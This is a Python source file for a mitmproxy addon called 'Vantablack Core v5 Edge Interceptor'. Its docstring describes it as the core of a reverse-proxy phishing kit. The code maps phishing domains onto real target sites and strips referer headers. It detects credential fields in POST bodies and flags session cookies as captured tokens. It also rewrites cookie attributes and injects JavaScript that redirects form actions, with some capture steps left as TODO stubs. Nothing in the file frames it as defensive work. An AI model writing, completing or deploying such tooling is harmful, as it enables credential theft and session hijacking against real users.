"""
Vantablack Core v5 - Edge Interceptor
=====================================

Core mitmproxy addon that handles:
- Request rewriting (Phishing Domain -> Target Domain)
- Response rewriting (Target Domain -> Phishing Domain)
- Credential harvesting
- Session token capture
- Javascript injection
"""

import logging
import re
try:
    from mitmproxy import http, ctx
except Exception:
    class http:  # type: ignore
        class HTTPFlow:  # type: ignore
            pass
    class ctx:  # type: ignore
        pass
from core.edge.phishlets import PhishletConfig, PhishletLoader
from core.edge.session import SessionManager
from core.common import config
from core.common.metrics import RATE_LIMITED, BLOCKED_IP
import time

class VantaInterceptor:
    def __init__(self, phishlet: PhishletConfig, session_manager: SessionManager):
        self.phishlet = phishlet
        self.session_manager = session_manager
        self.logger = logging.getLogger("vantablack.edge.interceptor")
        self.logger.info(f"Interceptor loaded for phishlet: {phishlet.name}")
        self.limit_per_min = config.get_int("RATE_LIMIT_PER_MINUTE", 120)
        self.allow_ips = set(config.get_list("ALLOW_IPS"))
        self.deny_ips = set(config.get_list("DENY_IPS"))
        self._buckets = {}  # ip -> [timestamps]

    def request(self, flow: http.HTTPFlow):
        """
        Handle incoming request:
        1. Identify session (cookie/path)
        2. Map host (phishing -> target)
        3. Strip indicators (referer)
        4. Path rewrites & blocklist
        """
        host = flow.request.pretty_host
        client_ip = "0.0.0.0"
        try:
            client_ip = getattr(flow.client_conn, "address", ("0.0.0.0", 0))[0]  # type: ignore
        except Exception:
            pass
        # ACL
        if (self.allow_ips and client_ip not in self.allow_ips) or (client_ip in self.deny_ips):
            try:
                BLOCKED_IP.labels(ip=client_ip).inc()
                if hasattr(http, "Response"):
                    flow.response = http.Response.make(403, b"Forbidden", {})
                    return
            except Exception:
                return
        # Rate limit
        now = time.time()
        bucket = self._buckets.setdefault(client_ip, [])
        # purge entries older than 60s
        bucket[:] = [t for t in bucket if now - t < 60]
        if len(bucket) >= self.limit_per_min:
            RATE_LIMITED.labels(ip=client_ip).inc()
            if hasattr(http, "Response"):
                flow.response = http.Response.make(429, b"Too Many Requests", {})
                return
        else:
            bucket.append(now)
        
        # TODO: Dynamic mapping based on loaded phishlet
        # For prototype, we assume the first proxy_host maps to target
        target_map = {m.subdomain: m.target for m in self.phishlet.proxy_hosts}
        
        # Check if we are hitting a known phishing host
        # (Simplified matching logic for V5 MVP)
        for phish_sub, target_host in target_map.items():
            if phish_sub in host:
                flow.request.host = target_host
                self.logger.debug(f"Rewrote host: {host} -> {target_host}")
                break
        
        # Remove potentially leaking headers
        if "referer" in flow.request.headers:
            del flow.request.headers["referer"]

        # Blocklist resources early
        try:
            url = getattr(flow.request, "pretty_url", "") or getattr(flow.request, "path", "")
            for rule in getattr(self.phishlet, "blocklist", []):
                if re.search(rule.pattern, url):
                    self.logger.info(f"Blocking resource by rule: {rule.pattern}")
                    if hasattr(http, "Response"):
                        flow.response = http.Response.make(204, b"", {"content-type": "text/plain"})
                    return
        except Exception:
            pass

        # Path rewrites
        try:
            path = getattr(flow.request, "path", "")
            method = getattr(flow.request, "method", "GET")
            for rule in getattr(self.phishlet, "path_rewrites", []):
                if method in rule.methods and re.search(rule.pattern, path):
                    new_path = re.sub(rule.pattern, rule.replace, path)
                    self.logger.debug(f"Rewrote path: {path} -> {new_path}")
                    flow.request.path = new_path
        except Exception:
            pass

        # Capture Credentials (POST)
        if flow.request.method == "POST":
            self._scan_for_credentials(flow)

    def response(self, flow: http.HTTPFlow):
        """
        Handle outgoing response:
        1. Map host (target -> phishing) in Location/Cookies
        2. Inject JS hooks
        3. Capture session tokens
        4. Header & Cookie rewrite rules
        """
        # 1. Rewrite Location headers
        if "Location" in flow.response.headers:
            loc = flow.response.headers["Location"]
            # TODO: Reverse map target -> phishing domain
            # flow.response.headers["Location"] = ...
            pass

        # 2. Capture Set-Cookie
        self._scan_for_tokens(flow)

        # 2b. Apply cookie rewrite rules
        try:
            for rule in getattr(self.phishlet, "cookie_rewrites", []):
                if rule.name in flow.response.cookies:
                    value, attrs = flow.response.cookies[rule.name]
                    if rule.domain_to:
                        attrs["domain"] = rule.domain_to
                    if rule.path_to:
                        attrs["path"] = rule.path_to
                    if rule.samesite:
                        attrs["samesite"] = rule.samesite
                    if rule.secure is not None:
                        attrs["secure"] = rule.secure
                    flow.response.cookies[rule.name] = (value, attrs)
        except Exception:
            pass

        # 2c. Header rules
        try:
            for hr in getattr(self.phishlet, "headers", []):
                name = hr.name
                action = hr.action.lower()
                if action == "remove":
                    if name in flow.response.headers:
                        del flow.response.headers[name]
                elif action == "set" and hr.value is not None:
                    flow.response.headers[name] = hr.value
        except Exception:
            pass
        # 2d. Blocklist by mime/size
        try:
            ctype = flow.response.headers.get("content-type", "")
            clen = 0
            try:
                clen = int(flow.response.headers.get("content-length", "0"))
            except Exception:
                clen = len(flow.response.content or b"")
            for rule in getattr(self.phishlet, "blocklist", []):
                if rule.mimes and not any(m in ctype for m in rule.mimes):
                    continue
                if rule.max_kb is not None and clen > rule.max_kb * 1024:
                    if hasattr(http, "Response"):
                        flow.response = http.Response.make(204, b"", {"content-type": "text/plain"})
                        return
        except Exception:
            pass

        # 3. Inject Content
        if flow.response.content:
            self._inject_scripts(flow)

    def _scan_for_credentials(self, flow: http.HTTPFlow):
        """Analyze POST body for defined credential fields"""
        try:
            content = flow.request.get_text(strict=False) if hasattr(flow.request, "get_text") else flow.request.text
            for rule in self.phishlet.credentials:
                if rule.type == "post_param" and rule.name:
                    if re.search(rf"(?:^|&){re.escape(rule.name)}=", content):
                        self.logger.info(f"Detected credential param: {rule.name}")
                        # TODO: capture and store via session_manager
        except Exception:
            pass

    def _scan_for_tokens(self, flow: http.HTTPFlow):
        """Analyze Set-Cookie headers for session tokens"""
        cookies = flow.response.cookies
        for name, (value, attrs) in cookies.items():
            # Check against phishlet auth_tokens rules
            for rule in self.phishlet.auth_tokens:
                if rule.name == name:
                    # Capture!
                    # Need session_id from flow context (to be implemented)
                    # self.session_manager.capture_token(...)
                    self.logger.info(f"Captured token candidate: {name}")

    def _inject_scripts(self, flow: http.HTTPFlow):
        if "text/html" in flow.response.headers.get("content-type", ""):
            for injection in self.phishlet.injections:
                if injection.position == "body_end":
                    flow.response.text = flow.response.text.replace(
                        "</body>", 
                        f"<script>{injection.content}</script></body>"
                    )
            if getattr(self.phishlet, "form_actions", []):
                parts = []
                for r in self.phishlet.form_actions:
                    sel = r.selector.replace("'", "\\'")
                    act = r.action_to.replace("'", "\\'")
                    parts.append(f"document.querySelectorAll('{sel}').forEach(function(f){{try{{f.setAttribute('action','{act}')}}catch(e){{}}}});")
                js = "(function(){try{" + "".join(parts) + "}catch(e){}})();"
                flow.response.text = flow.response.text.replace(
                    "</body>",
                    f"<script>{js}</script></body>"
                )
